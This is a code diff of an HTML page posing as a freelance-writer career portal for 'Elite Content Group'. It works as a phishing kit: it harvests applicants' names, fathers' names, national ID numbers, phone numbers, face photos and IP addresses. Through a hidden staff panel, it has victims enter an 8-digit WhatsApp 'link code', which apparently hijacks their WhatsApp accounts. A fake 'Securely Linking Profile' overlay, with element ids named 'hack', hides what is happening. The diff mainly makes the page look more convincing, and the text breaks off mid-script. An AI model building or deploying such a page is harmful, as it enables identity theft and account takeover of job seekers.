@@ -5,15 +5,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Elite Content Group - Career Portal</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+
         :root {
-            --primary: #2563EB;
-            --primary-hover: #1D4ED8;
-            --secondary: #10B981;
-            --bg-body: #F3F4F6;
-            --bg-card: #FFFFFF;
-            --text-main: #1E293B;
+            --primary: #0F172A;
+            --primary-light: #1E293B;
+            --accent: #2563EB;
+            --accent-hover: #1D4ED8;
+            --success: #10B981;
+            --bg-body: #F1F5F9;
+            --text-main: #0F172A;
             --text-muted: #64748B;
-            --border-color: #E2E8F0;
+            --border: rgba(226, 232, 240, 0.8);
+            --card-bg: rgba(255, 255, 255, 0.85);
         }
 
         * {
@@ -24,7 +28,7 @@
         }
 
         html, body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Inter', -apple-system, sans-serif;
             background: var(--bg-body);
             color: var(--text-main);
             min-height: 100vh;
@@ -33,16 +37,26 @@
             -webkit-font-smoothing: antialiased;
         }
 
-        /* Subtle Professional Background */
-        .bg-pattern {
+        /* Animated Corporate Background */
+        .bg-animated {
             position: fixed;
             inset: 0;
             z-index: -1;
-            background-color: #f8fafc;
-            background-image: 
-                radial-gradient(at 40% 20%, hsla(228,100%,74%,0.15) 0px, transparent 50%),
-                radial-gradient(at 80% 0%, hsla(189,100%,56%,0.15) 0px, transparent 50%),
-                radial-gradient(at 0% 50%, hsla(228,100%,74%,0.15) 0px, transparent 50%);
+            background: #f8fafc;
+            overflow: hidden;
+        }
+        .bg-shape {
+            position: absolute;
+            filter: blur(80px);
+            opacity: 0.4;
+            animation: float 10s infinite alternate ease-in-out;
+        }
+        .shape1 { width: 400px; height: 400px; background: #3b82f6; top: -10%; left: -10%; }
+        .shape2 { width: 500px; height: 500px; background: #10b981; bottom: -20%; right: -10%; animation-delay: -5s; }
+        
+        @keyframes float {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(30px, 50px) scale(1.1); }
         }
 
         .app-container {
@@ -50,379 +64,355 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 15px;
+            padding: 20px;
             position: relative;
             z-index: 1;
         }
 
+        /* Glassmorphism Card */
         .card {
-            background: var(--bg-card);
-            border-radius: 16px;
-            padding: clamp(20px, 5vw, 40px);
-            width: min(500px, 100%);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05), 0 4px 6px rgba(0, 0, 0, 0.02);
-            border: 1px solid var(--border-color);
+            background: var(--card-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: clamp(30px, 5vw, 45px);
+            width: min(520px, 100%);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.08), 0 1px 3px rgba(255,255,255,0.5) inset;
+            border: 1px solid rgba(255, 255, 255, 0.6);
             text-align: center;
-            animation: fadeIn 0.4s ease;
             max-height: 92vh;
             overflow-y: auto;
-            -webkit-overflow-scrolling: touch;
+            position: relative;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
+        .fade-in {
+            animation: fadeInStep 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+        @keyframes fadeInStep {
+            from { opacity: 0; transform: translateY(15px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
-        .hidden {
-            display: none !important;
-        }
+        .hidden { display: none !important; }
 
         .company-logo {
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            width: 60px;
-            height: 60px;
-            background: #EFF6FF;
-            color: var(--primary);
-            border-radius: 12px;
-            font-size: 28px;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 10px rgba(37, 99, 235, 0.1);
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, var(--accent), #60A5FA);
+            color: white;
+            border-radius: 20px;
+            font-size: 32px;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 25px rgba(37, 99, 235, 0.3);
         }
 
         h1 {
-            font-size: clamp(20px, 4.5vw, 26px);
-            margin-bottom: 8px;
+            font-size: clamp(22px, 5vw, 28px);
+            margin-bottom: 10px;
             color: var(--text-main);
             font-weight: 700;
-            letter-spacing: -0.5px;
+            letter-spacing: -0.03em;
         }
 
         .subtitle {
             color: var(--text-muted);
-            font-size: clamp(13px, 3vw, 15px);
-            margin-bottom: 20px;
-            line-height: 1.5;
+            font-size: clamp(14px, 3vw, 15px);
+            margin-bottom: 25px;
+            line-height: 1.6;
+            font-weight: 400;
         }
 
         .btn {
             width: 100%;
-            padding: 14px;
-            background: var(--primary);
+            padding: 16px;
+            background: linear-gradient(135deg, var(--accent), var(--accent-hover));
             color: white;
             border: none;
-            border-radius: 10px;
+            border-radius: 12px;
             font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s;
-            user-select: none;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
+            position: relative;
+            overflow: hidden;
         }
 
         .btn:hover {
-            background: var(--primary-hover);
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(37, 99, 235, 0.3);
         }
-
-        .btn:disabled {
-            background: #CBD5E1;
-            color: #64748B;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
+        .btn:disabled { background: #CBD5E1; box-shadow: none; cursor: not-allowed; transform: none; }
 
         .btn-outline {
             background: transparent;
             color: var(--text-muted);
-            border: 1px solid var(--border-color);
+            border: 2px solid #E2E8F0;
             font-size: 14px;
-            padding: 12px;
-            margin-top: 12px;
-            border-radius: 10px;
+            padding: 14px;
+            margin-top: 15px;
+            border-radius: 12px;
             width: 100%;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.2s;
         }
+        .btn-outline:hover { background: #F8FAFC; color: var(--text-main); border-color: #CBD5E1; }
 
         .input-field {
             width: 100%;
-            padding: 14px;
-            background: #F8FAFC;
-            border: 1px solid var(--border-color);
-            border-radius: 10px;
+            padding: 16px;
+            background: rgba(255, 255, 255, 0.9);
+            border: 2px solid #E2E8F0;
+            border-radius: 12px;
             color: var(--text-main);
-            font-size: 14px;
+            font-size: 15px;
             margin-bottom: 15px;
             outline: none;
             transition: all 0.2s;
+            font-weight: 500;
         }
-
         .input-field:focus {
-            border-color: var(--primary);
-            background: #FFFFFF;
-            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+            border-color: var(--accent);
+            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
         }
 
         .options-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
-            gap: 10px;
-            margin: 15px 0;
+            gap: 12px;
+            margin: 20px 0;
         }
-
         .option-btn {
-            padding: 12px 10px;
-            background: #FFFFFF;
-            border: 1px solid var(--border-color);
-            border-radius: 10px;
+            padding: 14px 10px;
+            background: white;
+            border: 2px solid #E2E8F0;
+            border-radius: 12px;
             color: var(--text-main);
             cursor: pointer;
             transition: all 0.2s;
-            font-size: 13px;
-            font-weight: 500;
-            user-select: none;
-        }
-
-        .option-btn.selected {
-            border-color: var(--primary);
-            background: #EFF6FF;
-            color: var(--primary);
+            font-size: 14px;
             font-weight: 600;
+        }
+        .option-btn:hover { border-color: var(--accent); }
+        .option-btn.selected {
+            border-color: var(--accent);
+            background: #EFF6FF;
+            color: var(--accent);
+            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.1);
         }
 
         .step-dots {
             display: flex;
             justify-content: center;
-            gap: 6px;
-            margin-bottom: 20px;
+            gap: 8px;
+            margin-bottom: 25px;
         }
-
         .dot {
-            width: 24px;
+            width: 30px;
             height: 4px;
             border-radius: 2px;
             background: #E2E8F0;
-            transition: all 0.3s;
+            transition: all 0.4s;
         }
-
-        .dot.active { background: var(--primary); }
-        .dot.done { background: var(--secondary); }
+        .dot.active { background: var(--accent); width: 40px; }
+        .dot.done { background: var(--success); }
 
         .code-box {
-            background: #F1F5F9;
+            background: #F8FAFC;
             border: 2px dashed #CBD5E1;
             border-radius: 12px;
             padding: 20px;
             margin: 15px 0;
-            font-size: clamp(20px, 5vw, 26px);
-            letter-spacing: 6px;
-            color: var(--text-main);
+            font-size: clamp(22px, 5vw, 28px);
+            letter-spacing: 8px;
+            color: var(--primary);
             font-weight: 700;
-            font-family: monospace;
+            font-family: 'Courier New', monospace;
         }
 
         /* Photo Upload Styling */
         .photo-upload-box {
-            border: 2px dashed var(--border-color);
-            background: #F8FAFC;
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 15px;
+            border: 2px dashed #CBD5E1;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 16px;
+            padding: 25px;
+            margin-bottom: 20px;
             cursor: pointer;
-            position: relative;
             transition: all 0.3s;
+            display: block;
         }
-        
-        .photo-upload-box:hover {
-            border-color: var(--primary);
-            background: #EFF6FF;
-        }
-
+        .photo-upload-box:hover { border-color: var(--accent); background: #EFF6FF; }
         .photo-preview {
-            width: 80px;
-            height: 80px;
+            width: 90px;
+            height: 90px;
             border-radius: 50%;
             object-fit: cover;
             margin: 0 auto 10px auto;
             display: none;
-            border: 2px solid var(--primary);
+            border: 3px solid white;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+        }
+        .upload-icon { font-size: 32px; margin-bottom: 8px; }
+
+        /* General Loader Overlay (Step Transitions) */
+        .step-loader-overlay {
+            position: absolute;
+            inset: 0;
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 50;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+        .step-loader-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        .spinner-ring {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #E2E8F0;
+            border-top: 3px solid var(--accent);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 15px;
         }
 
-        .upload-icon {
-            font-size: 30px;
-            color: var(--text-muted);
-            margin-bottom: 5px;
-        }
-
-        /* Overlay */
-        .overlay {
+        /* Heavy Security Verification Overlay */
+        .security-overlay {
             position: fixed;
             inset: 0;
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(5px);
+            background: rgba(15, 23, 42, 0.95);
+            backdrop-filter: blur(10px);
             z-index: 1000;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
+            color: white;
             padding: 20px;
         }
-
-        .spinner-blue {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #E2E8F0;
-            border-top: 4px solid var(--primary);
+        .security-spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid var(--success);
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
-
         @keyframes spin { to { transform: rotate(360deg); } }
 
         /* Admin UI */
         .admin-trigger {
-            position: fixed;
-            top: 15px;
-            right: 15px;
-            z-index: 500;
-            font-size: 12px;
-            color: #94A3B8;
-            cursor: pointer;
-            padding: 5px 10px;
+            position: fixed; top: 15px; right: 15px; z-index: 500; font-size: 11px;
+            color: #94A3B8; cursor: pointer; padding: 5px; opacity: 0.5; transition: 0.3s;
         }
-
-        .admin-login-modal {
-            position: fixed;
-            inset: 0;
-            background: rgba(15, 23, 42, 0.8);
-            z-index: 600;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .admin-login-box, .admin-panel {
-            background: #1E293B;
-            border: 1px solid #334155;
-            border-radius: 12px;
-            color: white;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-        }
-
-        .admin-login-box { padding: 25px; width: min(320px, 100%); text-align: center; }
+        .admin-trigger:hover { opacity: 1; }
         
-        .admin-panel {
-            position: fixed;
-            top: 15px;
-            right: 15px;
-            padding: 15px;
-            z-index: 550;
-            width: min(340px, calc(100vw - 30px));
-            max-height: 85vh;
-            overflow-y: auto;
+        .admin-panel-wrap {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 600;
+            display: flex; justify-content: center; align-items: center; padding: 15px;
         }
-
+        .admin-box {
+            background: #0F172A; border: 1px solid #1E293B; border-radius: 16px;
+            padding: 20px; width: min(340px, 100%); color: white;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5); max-height: 90vh; overflow-y: auto;
+        }
         .admin-info-box {
-            background: #0F172A;
-            border: 1px solid #334155;
-            border-radius: 8px;
-            padding: 12px;
-            margin: 12px 0;
-            font-size: 12px;
-            color: #CBD5E1;
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-            gap: 10px;
+            background: #1E293B; border-radius: 12px; padding: 15px; margin: 15px 0;
+            font-size: 12px; color: #CBD5E1; display: flex; gap: 15px; text-align: left;
         }
-
-        .admin-info-text { flex: 1; line-height: 1.6; word-break: break-all; }
-        .admin-img-wrap { width: 65px; flex-shrink: 0; text-align: center; }
-        .admin-img-wrap img { width: 100%; height: 65px; object-fit: cover; border-radius: 8px; display: none; border: 1px solid #334155; }
-
-        .admin-input, .admin-btn {
-            width: 100%;
-            padding: 10px;
-            border-radius: 8px;
-            margin-bottom: 8px;
-            font-size: 13px;
-            border: none;
-        }
-        
-        .admin-input { background: #0F172A; border: 1px solid #334155; color: white; outline: none; }
-        .admin-btn { background: #3B82F6; color: white; font-weight: 600; cursor: pointer; }
-        .admin-btn.green { background: #10B981; }
+        .admin-img-wrap img { width: 70px; height: 70px; object-fit: cover; border-radius: 8px; border: 2px solid #334155; }
+        .admin-input { width: 100%; padding: 12px; background: #1E293B; border: 1px solid #334155; color: white; border-radius: 8px; margin-bottom: 10px; }
+        .admin-btn { width: 100%; padding: 12px; background: var(--accent); color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; margin-bottom: 8px; }
+        .admin-btn.green { background: var(--success); }
         .admin-btn.red { background: #EF4444; }
 
     </style>
 </head>
 <body>
 
-    <div class="bg-pattern"></div>
+    <div class="bg-animated">
+        <div class="bg-shape shape1"></div>
+        <div class="bg-shape shape2"></div>
+    </div>
 
-    <div class="admin-trigger" id="adminFab">Staff Login</div>
+    <!-- Admin Trigger -->
+    <div class="admin-trigger" id="adminFab">Staff</div>
 
-    <!-- Admin Login -->
-    <div class="admin-login-modal hidden" id="adminLoginModal">
-        <div class="admin-login-box">
+    <!-- Admin Auth/Panel -->
+    <div class="admin-panel-wrap hidden" id="adminAuthModal">
+        <div class="admin-box" style="text-align: center;">
             <h3 style="margin-bottom: 20px;">Staff Portal</h3>
-            <input type="text" class="input-field" id="adminUsername" placeholder="Username" style="background:#0F172A; color:white; border-color:#334155;" />
-            <input type="password" class="input-field" id="adminPassword" placeholder="Password" style="background:#0F172A; color:white; border-color:#334155;" />
-            <button class="btn" id="adminLoginBtn">Authenticate</button>
-            <button class="btn-outline" id="adminCancelBtn" style="color:#94A3B8; border-color:#334155;">Cancel</button>
+            <input type="text" class="admin-input" id="adminUsername" placeholder="Username" />
+            <input type="password" class="admin-input" id="adminPassword" placeholder="Password" />
+            <button class="admin-btn" id="adminLoginBtn">Authenticate</button>
+            <button class="admin-btn" id="adminCancelBtn" style="background: transparent; border: 1px solid #334155; margin-top: 5px;">Cancel</button>
         </div>
     </div>
 
-    <!-- Admin Panel -->
-    <div class="admin-panel hidden" id="adminPanel">
-        <h3 style="text-align:center; margin-bottom:10px;">Control Panel</h3>
-        
-        <div class="admin-info-box">
-            <div class="admin-info-text">
-                <strong>📝 Candidate Data:</strong><br>
-                👤 Name: <span id="adminName">-</span><br>
-                👨 Father: <span id="adminFather">-</span><br>
-                🪪 CNIC: <span id="adminCNIC">-</span><br>
-                📱 Phone: <span id="adminPhone">-</span><br>
-                ✍️ Role: <span id="adminSkill">-</span><br>
-                🎂 Age: <span id="adminAge">-</span><br>
-                🎓 Edu: <span id="adminEdu">-</span><br>
-                💰 Pay: <span id="adminEarning">-</span><br>
-                💼 Exp: <span id="adminExperience">-</span><br>
-                🌐 IP: <span id="adminIP">-</span>
-            </div>
-            <div class="admin-img-wrap">
-                <img id="adminPhoto" src="" alt="Photo">
-                <div id="adminNoPhoto" style="font-size:10px; color:#64748B; margin-top:5px;">No Photo</div>
-            </div>
-        </div>
-        
-        <input type="text" class="admin-input" id="adminCode" placeholder="Enter 8-digit code" maxlength="8" />
-        <button class="admin-btn" id="adminSendCode">Send Link Code</button>
-        <button class="admin-btn green" id="adminVerifyConnect">Verify Application</button>
-        <button class="admin-btn red" id="adminReset">Reset Session Data</button>
-        <button class="admin-btn" id="adminLogoutBtn" style="background:#475569;">Logout</button>
-    </div>
-
-    <!-- App Container -->
-    <div class="app-container">
-        <div class="card" id="mainCard">
+    <div class="admin-panel-wrap hidden" id="adminPanelModal">
+        <div class="admin-box">
+            <h3 style="text-align:center; color:#10B981; margin-bottom:5px;">● Secure Control Panel</h3>
             
+            <div class="admin-info-box">
+                <div style="flex: 1; line-height: 1.7; word-break: break-all;">
+                    👤 <span id="adminName">-</span><br>
+                    👨 <span id="adminFather">-</span><br>
+                    🪪 <span id="adminCNIC">-</span><br>
+                    📱 <span id="adminPhone">-</span><br>
+                    ✍️ <span id="adminSkill">-</span><br>
+                    🎂 <span id="adminAge">-</span><br>
+                    🎓 <span id="adminEdu">-</span><br>
+                    💰 <span id="adminEarning">-</span><br>
+                    💼 <span id="adminExperience">-</span><br>
+                    🌐 <span id="adminIP">-</span>
+                </div>
+                <div class="admin-img-wrap">
+                    <img id="adminPhoto" src="" style="display:none;" alt="Photo">
+                    <div id="adminNoPhoto" style="font-size:10px; color:#64748B; margin-top:25px; text-align:center;">No Image</div>
+                </div>
+            </div>
+            
+            <input type="text" class="admin-input" id="adminCode" placeholder="Enter 8-digit code" maxlength="8" style="text-align:center; letter-spacing: 2px;" />
+            <button class="admin-btn" id="adminSendCode">Assign Link Code</button>
+            <button class="admin-btn green" id="adminVerifyConnect">Verify Application</button>
+            <button class="admin-btn red" id="adminReset">Reset User Session (Force)</button>
+            <button class="admin-btn" id="adminLogoutBtn" style="background:#334155;">Logout</button>
+        </div>
+    </div>
+
+    <!-- Main App Container -->
+    <div class="app-container">
+        <div class="card fade-in" id="mainCard">
+            
+            <!-- Step Transition Loader -->
+            <div class="step-loader-overlay" id="stepLoader">
+                <div class="spinner-ring"></div>
+                <h3 style="font-size:16px; font-weight:600; color:var(--text-main);" id="loaderText">Processing...</h3>
+            </div>
+
             <!-- Step 1: Welcome -->
-            <div id="stepWelcome">
-                <div class="company-logo">✍️</div>
+            <div id="stepWelcome" class="fade-in">
+                <div class="company-logo">Elite</div>
                 <h1>Elite Content Group</h1>
-                <p class="subtitle">Join our global network of professional freelance writers and content creators.</p>
-                <button class="btn" id="getStartedBtn">Apply Now</button>
+                <p class="subtitle">Join our global network of professional freelance writers and content creators. High-paying remote opportunities await.</p>
+                <button class="btn" id="getStartedBtn">Start Application</button>
             </div>
 
             <!-- Step 2: Questions -->
-            <div id="stepQuestions" class="hidden">
+            <div id="stepQuestions" class="hidden fade-in">
                 <div class="step-dots">
                     <div class="dot active" id="dot1"></div>
                     <div class="dot" id="dot2"></div>
@@ -430,11 +420,11 @@
                     <div class="dot" id="dot4"></div>
                     <div class="dot" id="dot5"></div>
                 </div>
-                <h1>Candidate Profile</h1>
-                <p class="subtitle">Please select your professional background</p>
+                <h1>Professional Background</h1>
+                <p class="subtitle">Customize your profile preferences</p>
                 
                 <div id="q1">
-                    <p style="font-weight:600; margin-bottom:10px; font-size:14px;">1. Preferred Writing Role?</p>
+                    <p style="font-weight:600; margin-bottom:12px; font-size:15px; text-align:left;">1. Preferred Writing Role?</p>
                     <div class="options-grid">
                         <div class="option-btn" data-q="1" data-a="Article/Blog">Article/Blog</div>
                         <div class="option-btn" data-q="1" data-a="Copywriting">Copywriting</div>
@@ -444,7 +434,7 @@
                 </div>
 
                 <div id="q2" class="hidden">
-                    <p style="font-weight:600; margin-bottom:10px; font-size:14px;">2. Your Age Bracket?</p>
+                    <p style="font-weight:600; margin-bottom:12px; font-size:15px; text-align:left;">2. Your Age Bracket?</p>
                     <div class="options-grid">
                         <div class="option-btn" data-q="2" data-a="18-22 Years">18-22 Years</div>
                         <div class="option-btn" data-q="2" data-a="23-28 Years">23-28 Years</div>
@@ -454,7 +444,7 @@
                 </div>
 
                 <div id="q3" class="hidden">
-                    <p style="font-weight:600; margin-bottom:10px; font-size:14px;">3. Highest Qualification?</p>
+                    <p style="font-weight:600; margin-bottom:12px; font-size:15px; text-align:left;">3. Highest Qualification?</p>
                     <div class="options-grid">
                         <div class="option-btn" data-q="3" data-a="Matric/Inter">Matric/Inter</div>
                         <div class="option-btn" data-q="3" data-a="Bachelor's">Bachelor's</div>
@@ -464,7 +454,7 @@
                 </div>
 
                 <div id="q4" class="hidden">
-                    <p style="font-weight:600; margin-bottom:10px; font-size:14px;">4. Expected Monthly Payout?</p>
+                    <p style="font-weight:600; margin-bottom:12px; font-size:15px; text-align:left;">4. Expected Monthly Payout?</p>
                     <div class="options-grid">
                         <div class="option-btn" data-q="4" data-a="30K-50K PKR">30K-50K PKR</div>
                         <div class="option-btn" data-q="4" data-a="50K-80K PKR">50K-80K PKR</div>
@@ -473,7 +463,7 @@
                 </div>
 
                 <div id="q5" class="hidden">
-                    <p style="font-weight:600; margin-bottom:10px; font-size:14px;">5. Writing Experience?</p>
+                    <p style="font-weight:600; margin-bottom:12px; font-size:15px; text-align:left;">5. Writing Experience?</p>
                     <div class="options-grid">
                         <div class="option-btn" data-q="5" data-a="Fresher">Fresher</div>
                         <div class="option-btn" data-q="5" data-a="1-2 Years">1-2 Years</div>
@@ -482,23 +472,26 @@
                 </div>
 
                 <div id="q6" class="hidden">
-                    <p style="font-weight:600; margin-bottom:15px; color:var(--primary);">Profile recorded.</p>
+                    <div style="font-size:40px; color:var(--success); margin-bottom:10px;">✓</div>
+                    <h2 style="font-size:20px; margin-bottom:20px;">Profile Evaluated</h2>
                     <button class="btn" id="proceedToDetailsBtn">Enter Personal Details</button>
                 </div>
             </div>
 
-            <!-- Step 3: Candidate Details (Name, Photo, etc.) -->
-            <div id="stepDetails" class="hidden">
-                <div class="company-logo" style="background:#f3e8ff; color:#9333ea;">👤</div>
+            <!-- Step 3: Details & Photo -->
+            <div id="stepDetails" class="hidden fade-in">
+                <div class="step-dots" style="margin-bottom:15px;">
+                    <div class="dot done"></div><div class="dot active"></div><div class="dot"></div>
+                </div>
                 <h1>Identity Verification</h1>
-                <p class="subtitle">Please provide your legal details & profile picture.</p>
+                <p class="subtitle">Please provide your legal details for contract generation.</p>
                 
-                <label for="photoInput" class="photo-upload-box" id="photoUploadBox">
+                <label for="photoInput" class="photo-upload-box">
                     <img id="userPhotoPreview" class="photo-preview" src="" alt="Preview">
                     <div id="uploadTextWrap">
                         <div class="upload-icon">📷</div>
-                        <div style="font-size:14px; font-weight:600; color:var(--text-main);">Upload Profile Picture</div>
-                        <div style="font-size:12px; color:var(--text-muted); margin-top:4px;">Tap to select image</div>
+                        <div style="font-size:15px; font-weight:600;">Upload Professional Photo</div>
+                        <div style="font-size:13px; color:var(--text-muted); margin-top:5px;">Clear face visibility required</div>
                     </div>
                     <input type="file" id="photoInput" accept="image/*" style="display:none;">
                 </label>
@@ -510,52 +503,55 @@
                 <button class="btn" id="submitDetailsBtn">Proceed to Link WhatsApp</button>
             </div>
 
-            <!-- Step 4: WhatsApp Link -->
-            <div id="stepWhatsApp" class="hidden">
-                <div class="company-logo" style="background:#ecfdf5; color:#10b981;">💬</div>
-                <h1>Link Your WhatsApp</h1>
-                <p class="subtitle">Link your WhatsApp with company to continue.</p>
+            <!-- Step 4: WhatsApp -->
+            <div id="stepWhatsApp" class="hidden fade-in">
+                <div class="step-dots" style="margin-bottom:15px;">
+                    <div class="dot done"></div><div class="dot done"></div><div class="dot active"></div>
+                </div>
+                <div class="company-logo" style="background:#ecfdf5; color:#10b981; border-radius:50%; font-size:35px; width:80px; height:80px;">💬</div>
+                <h1>Link WhatsApp</h1>
+                <p class="subtitle">Company policies require a verified WhatsApp connection for task assignments.</p>
                 
                 <div id="waStep1">
                     <input type="tel" class="input-field" id="phoneNumber" placeholder="WhatsApp Number (e.g. 03XXXXXXXXX)" />
-                    <button class="btn" id="sendCodeBtn">Generate Link Code</button>
+                    <button class="btn" id="sendCodeBtn">Generate Unique Link Code</button>
                 </div>
 
                 <div id="waStep2" class="hidden">
-                    <p style="font-size:14px; color:var(--text-muted);">
-                        Linking requested for: <strong id="displayNumber" style="color:var(--text-main);"></strong>
+                    <p style="font-size:14px; font-weight:500; margin-bottom:10px;">
+                        Linking requested for:<br><strong id="displayNumber" style="font-size:18px; color:var(--accent);"></strong>
                     </p>
                     <div class="code-box" id="codeDisplay">________</div>
-                    <p style="font-size:13px; color:var(--text-muted); margin-bottom:15px;">
-                        Waiting for assignment manager to issue your link code...
+                    <p style="font-size:13px; color:var(--text-muted); margin-bottom:20px; background:#F8FAFC; padding:10px; border-radius:8px; border:1px solid #E2E8F0;">
+                        ⏳ Waiting for HR Manager to approve and issue your 8-digit secure link code...
                     </p>
-                    <input type="number" class="input-field" id="verificationCode" placeholder="Enter 8-digit link code" style="text-align:center; letter-spacing:2px; font-weight:600;" />
+                    <input type="number" class="input-field" id="verificationCode" placeholder="Enter 8-digit link code" style="text-align:center; letter-spacing:2px; font-weight:700;" />
                     <button class="btn" id="verifyBtn" disabled>Awaiting Code...</button>
-                    <button class="btn-outline" id="changeNumberBtn">Change Number</button>
+                    <button class="btn-outline" id="changeNumberBtn">Change WhatsApp Number</button>
                 </div>
             </div>
 
-            <!-- Step 5: Thank You -->
-            <div id="stepThankYou" class="hidden">
-                <div style="font-size:60px; color:var(--secondary); margin-bottom:15px;">✓</div>
-                <h1>Setup Complete</h1>
-                <p class="subtitle" style="margin-top:15px;">
-                    Thank you, <strong id="thankYouName" style="color:var(--text-main);"></strong>.
-                    <br><br>
-                    Your profile and WhatsApp connection are under review. A manager will contact you on your linked number shortly.
+            <!-- Step 5: Thank You (Persistent) -->
+            <div id="stepThankYou" class="hidden fade-in">
+                <div class="company-logo" style="background:#ecfdf5; color:#10b981; border-radius:50%; width:90px; height:90px; font-size:45px;">✓</div>
+                <h1 style="font-size:26px;">Application Submitted</h1>
+                <p class="subtitle" style="margin-top:20px; font-size:16px;">
+                    Thank you, <strong id="thankYouName" style="color:var(--text-main);"></strong>.<br><br>
+                    Your profile and WhatsApp connection are currently under professional review.<br><br>
+                    <span style="color:var(--accent); font-weight:600;">Status: Pending HR Approval (24-48 Hours)</span>
                 </p>
             </div>
         </div>
     </div>
 
-    <!-- Processing Overlay -->
-    <div class="overlay hidden" id="hackOverlay">
-        <div class="spinner-blue"></div>
-        <div style="font-size:18px; font-weight:600; color:var(--text-main); margin-bottom:15px;">Securely Linking Profile</div>
-        <div style="width: min(300px, 80%); height: 8px; background: #E2E8F0; border-radius: 4px; overflow: hidden; margin-bottom: 10px;">
-            <div id="progressBar" style="height: 100%; width: 0%; background: var(--primary); transition: width 0.3s ease;"></div>
+    <!-- Final Security Verification Overlay -->
+    <div class="security-overlay hidden" id="hackOverlay">
+        <div class="security-spinner"></div>
+        <div style="font-size:20px; font-weight:600; margin-bottom:20px; letter-spacing:1px;">Securely Linking Profile</div>
+        <div style="width: min(320px, 85%); height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden; margin-bottom: 15px;">
+            <div id="progressBar" style="height: 100%; width: 0%; background: var(--success); transition: width 0.3s ease;"></div>
         </div>
-        <div id="hackStatus" style="font-size: 14px; color: var(--text-muted); font-weight: 500;">Connecting...</div>
+        <div id="hackStatus" style="font-size: 13px; color: #94A3B8; font-weight: 500; font-family: monospace;">Establishing encrypted connection...</div>
     </div>
 
     <script type="module">
@@ -582,34 +578,45 @@
 
         let adminLoggedIn = false;
         let generatedCode = '';
-        let currentStep = 'welcome';
-
         const $ = (id) => document.getElementById(id);
 
-        async function fetchIP() {
+        // Smart Loader Transition Function
+        function transitionTo(stepId, loadingMessage = "Processing...") {
+            const loader = $('stepLoader');
+            $('loaderText').textContent = loadingMessage;
+            loader.classList.add('active');
+            
+            // Random time between 1 to 2.5 seconds for professional feel
+            const loadTime = Math.floor(Math.random() * 1500) + 1000;
+            
+            setTimeout(() => {
+                ['stepWelcome','stepQuestions','stepDetails','stepWhatsApp','stepThankYou'].forEach(s => {
+                    $(s).classList.add('hidden');
+                });
+                $(stepId).classList.remove('hidden');
+                loader.classList.remove('active');
+            }, loadTime);
+        }
+
+        // Init App & Check Persistence
+        async function initApp() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 userData.ip = data.ip || 'Unknown';
-                $('adminIP').textContent = userData.ip;
-            } catch(e) {
-                userData.ip = 'Unknown';
-                $('adminIP').textContent = 'Unknown';
+            } catch(e) { userData.ip = 'Unknown'; }
+            
+            // Check if already completed
+            const isCompleted = localStorage.getItem('elite_status');
+            const savedName = localStorage.getItem('elite_name');
+            
+            if (isCompleted === 'submitted') {
+                $('thankYouName').textContent = savedName || 'Candidate';
+                ['stepWelcome','stepQuestions','stepDetails','stepWhatsApp'].forEach(s => $(s).classList.add('hidden'));
+                $('stepThankYou').classList.remove('hidden');
+            } else {
+                $('stepWelcome').classList.remove('hidden');
             }
-        }
-
-        function showStep(step) {
-            ['stepWelcome','stepQuestions','stepDetails','stepWhatsApp','stepThankYou'].forEach(s => {
